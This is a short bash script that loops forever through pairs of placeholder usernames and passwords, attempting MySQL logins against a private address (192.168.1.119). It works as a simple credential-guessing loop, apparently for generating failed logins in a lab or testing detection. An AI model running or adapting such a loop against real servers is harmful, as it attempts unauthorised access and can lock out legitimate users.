#!/bin/bash

uname=(test1 test2 test3 test4 test5 test6 test7)
pass=(tes1231t1 testtsdg2 test12313 tesaffadst4 testxvcb5 test6 t12saest7)

while true
do
    for ssh in ${!uname[*]}; do 
    echo "Trying username: ${uname[$ssh]} and password: ${pass[$ssh]}"
        mysql -u${uname[$ssh]} -p${pass[$ssh]} -h 192.168.1.119
        sleep 2
    done
done